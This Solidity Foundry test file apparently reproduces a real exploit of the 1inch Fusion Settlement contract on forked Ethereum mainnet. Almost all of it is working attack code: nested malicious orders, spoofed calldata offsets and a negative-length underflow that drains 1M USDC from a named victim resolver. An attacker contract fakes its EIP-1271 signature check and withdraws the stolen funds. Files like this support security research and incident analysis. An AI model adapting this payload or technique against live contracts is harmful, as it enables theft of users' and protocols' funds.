// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IUniswapV2Router02} from "../../utils/IUniswapV2Router.sol";
import {IUSDT, ISettlement, Order} from "./Interfaces.sol";

// Replication of the tx
// https://etherscan.io/tx/0x62734ce80311e64630a009dd101a967ea0a9c012fabbfce8eac90f0f4ca090d6

contract Exploit_OneInch is Test, TestHarness, TokenBalanceTracker {
    // Attacker EOA
    address public constant ATTACKER_EOA = 0xA7264a43A57Ca17012148c46AdBc15a5F951766e;

    // Protocol contracts
    // 1inch Settlement - the vulnerable contract
    ISettlement private constant settlement = ISettlement(0xA88800CD213dA5Ae406ce248380802BD53b47647);
    // 1inch Aggregation Router V5 - handles order fills
    address private constant AGGREGATION_ROUTER_V5 = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    // Victim resolver contract - TrustedVolumes Pool
    address RESOLVER = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;
    // Uniswap V2 Router - used to get initial USDT for orders
    IUniswapV2Router02 private uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // Token addresses
    IUSDT public constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // Initial balances
    uint256 private constant DRAIN_AMOUNT = 1_000_000e6; // 1M USDC to steal
    uint256 private constant INITAL_WETH = 0.001 ether;
    uint256 private constant INTIAL_SWAP = 0.0005 ether;
    uint256 private constant INITAL_USDT = 1e6; // 1 USDT for order execution

    // Flag 0x00: Continue processing - triggers recursive _settleOrder call
    // Used for orders 1-5 to build up the nested order chain
    bytes1 private constant INTERACTION_CONTINUE = 0x00; // Continue to next nested order
    // Flag 0x01: Finalize - triggers resolveOrders() callback to resolver
    // Used in the final malicious interaction to drain victim funds
    // https://github.com/1inch/fusion-protocol/blob/934a8e7db4b98258c4c734566e8fcbc15b818ab5/contracts/Settlement.sol#L29
    bytes1 private constant INTERACTION_FINALIZE = 0x01;

    // These offsets exploit how fillOrderTo() decodes dynamic bytes parameters
    // By providing fake offsets, we can make the decoder read from arbitrary calldata positions
    // Offset where signature data is located in the ABI-encoded calldata
    // Calculated: After order offset (0x20) + order struct location
    // Order struct at 0xE0 is 320 bytes (0x140), plus interactions offset (0x20)
    // So signature starts at 0x240
    uint256 private constant SPOOFED_SIGNATURE_OFFSET = 0x240;

    // Offset where interaction data is located
    // This is what the vulnerable code reads at (data.offset + 0x40)
    // We set this to point to our crafted interaction with negative length
    uint256 private constant SPOOFED_INTERACTION_OFFSET = 0x460;
    uint256 private constant PADDING_SIZE = SPOOFED_INTERACTION_OFFSET - SPOOFED_SIGNATURE_OFFSET;

    // Negative length causes the decoder to read backwards in calldata
    // -512 in two's complement = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00
    uint256 private constant NEGATIVE_LENGTH_UNDERFLOW = type(uint256).max - 511; // -512 as int256

    // Attacker contract
    AttackerContract internal attacker;

    function setUp() public {
        // Fork mainnet at the block before the attack
        cheat.createSelectFork(vm.envString("RPC_URL"), 21_982_110);

        // Deploy attacker contract that will execute orders
        attacker = new AttackerContract();

        // Set Initial balance
        deal(address(WETH), address(attacker), INITAL_WETH);

        // Swap some WETH for USDT - needed as makerAsset in orders
        // The attacker needs to provide 1 wei USDT per order as the "maker"
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDT);
        vm.startPrank(ATTACKER_EOA);
        uniswap.swapETHForExactTokens{value: INTIAL_SWAP}(
            INITAL_USDT, path, address(attacker), block.timestamp
        );
        // Approve router to pull USDT for order fills
        attacker.approve(address(USDT), AGGREGATION_ROUTER_V5, type(uint256).max);
        vm.stopPrank();

        // Setup balance tracking
        addTokenToTracker(address(USDC));
    }

    function test_attack() public {
        console.log("------- INITIAL BALANCES -------");

        logBalancesWithLabel("Attacker", address(attacker));
        logBalancesWithLabel("TrustedVolumes Pool", RESOLVER);

        console.log("------ STEP 1: Craft malicious order chain ------");
        console.log("Building 6 nested orders with calldata corruption payload...");
        bytes memory orderData = buildExploitPayload();

        console.log("\n------ STEP 2: Execute nested order attack -------");
        // tx.origin must be ATTACKER_EOA for isValidSignature() to return valid
        vm.prank(ATTACKER_EOA, ATTACKER_EOA);
        attacker.settle(orderData);

        console.log("\n------ FINAL BALANCES -------");
        logBalancesWithLabel("Attacker", address(attacker));
        logBalancesWithLabel("TrustedVolumes Pool", RESOLVER);
    }

    // Builds the nested order payload that exploits calldata manipulation
    // Orders are nested 6 deep, with the final order triggering the drain
    function buildExploitPayload() internal view returns (bytes memory) {
        bytes memory emptySignature = hex"";
        // This order has manipulated offsets that cause the decoder to
        // read the victim's address from our crafted suffix
        Order memory drainOrder = buildOrder({
            salt: 0,
            receiver: address(attacker), // Stolen funds destination
            takingAmount: DRAIN_AMOUNT
        });

        // Craft the suffix that will be read when negative length underflows
        // This data will be interpreted as the "from" address for the transfer
        bytes memory victimSuffix = abi.encode(
            0, // padding
            RESOLVER, // Source of funds
            address(USDC), // Token to drain
            0, // padding
            0, // padding
            address(USDC), // Token reference
            DRAIN_AMOUNT, // Amount to steal
            0x40 // offset
        );

        // 23 bytes of padding to align suffix data
        bytes memory suffixPadding = new bytes(23);
        bytes memory finalInteraction = abi.encodePacked(
            address(settlement), INTERACTION_FINALIZE, RESOLVER, suffixPadding, victimSuffix
        );

        // Zero padding that will be jumped over by negative length
        bytes memory calldataPadding = new bytes(PADDING_SIZE);

        // Interaction that triggers the drain via offset manipulation
        bytes memory interaction5 = abi.encodePacked(
            address(settlement),
            INTERACTION_CONTINUE,
            abi.encode(
                drainOrder,
                SPOOFED_SIGNATURE_OFFSET,
                SPOOFED_INTERACTION_OFFSET,
                0,
                DRAIN_AMOUNT,
                0,
                address(attacker)
            ),
            calldataPadding,
            NEGATIVE_LENGTH_UNDERFLOW, // -512: causes suffix write underflow
            finalInteraction
        );

        // Each nested order adds entries to the internal tracking array
        // This is necessary to reach the required array state for the exploit

        bytes memory interaction4 = buildNestedInteraction(
            buildOrder({salt: 0, receiver: address(attacker), takingAmount: 1}), emptySignature, interaction5
        );

        bytes memory interaction3 = buildNestedInteraction(
            buildOrder({salt: 1, receiver: address(attacker), takingAmount: 1}), emptySignature, interaction4
        );

        bytes memory interaction2 = buildNestedInteraction(
            buildOrder({salt: 2, receiver: address(attacker), takingAmount: 1}), emptySignature, interaction3
        );

        bytes memory interaction1 = buildNestedInteraction(
            buildOrder({salt: 3, receiver: address(attacker), takingAmount: 1}), emptySignature, interaction2
        );
        //  This is the first order processed by Settlement.settleOrders()
        Order memory entryOrder = buildOrder({salt: 4, receiver: address(attacker), takingAmount: 1});

        // Final payload: Entry order + chain of nested interactions
        return abi.encode(
            entryOrder,
            emptySignature,
            interaction1,
            0, // makingAmount override
            1, // takingAmount override
            0, // threshold
            address(attacker)
        );
    }

    // Helper to build a standard order struct
    function buildOrder(uint256 salt, address receiver, uint256 takingAmount)
        internal
        view
        returns (Order memory)
    {
        return Order({
            salt: salt,
            makerAsset: address(USDT),
            takerAsset: address(USDC),
            maker: address(attacker),
            receiver: receiver,
            allowedSender: address(settlement),
            makingAmount: 1,
            takingAmount: takingAmount,
            offsets: 0,
            interactions: ""
        });
    }

    // Helper to build nested interaction calldata
    function buildNestedInteraction(Order memory order, bytes memory signature, bytes memory nextInteraction)
        internal
        view
        returns (bytes memory)
    {
        return abi.encodePacked(
            address(settlement),
            INTERACTION_CONTINUE,
            abi.encode(
                order,
                signature,
                nextInteraction,
                0, // makingAmount
                1, // takingAmount
                0, // threshold
                address(attacker)
            )
        );
    }
}

// https://app.dedaub.com/ethereum/address/0x019bfc71d43c3492926d4a9a6c781f36706970c9/decompiled
contract AttackerContract {
    ISettlement public constant settlement = ISettlement(0xA88800CD213dA5Ae406ce248380802BD53b47647);
    address public constant ATTACKER_EOA = 0xA7264a43A57Ca17012148c46AdBc15a5F951766e;

    function approve(address token, address spender, uint256 amount) public {
        require(msg.sender == ATTACKER_EOA);
        IUSDT(token).approve(spender, amount);
    }

    function settle(bytes memory orders) external payable {
        settlement.settleOrders(orders);
    }

    // https://eips.ethereum.org/EIPS/eip-1271
    // EIP-1271 signature validation - returns valid if tx.origin is attacker
    //  This bypasses order signature verification for our malicious orders
    function isValidSignature(bytes32 hash, bytes memory signature) public returns (bytes4) {
        if (address(tx.origin) == ATTACKER_EOA) {
            return bytes4(keccak256("isValidSignature(bytes32,bytes)"));
        } else {
            return 0xffffffff;
        }
    }

    // Withdraw stolen funds
    function transfer(address _from, address _to, uint256 _wad) external {
        require(msg.sender == ATTACKER_EOA);
        IERC20(_from).transfer(_to, _wad);
    }

    fallback() external payable {}
}
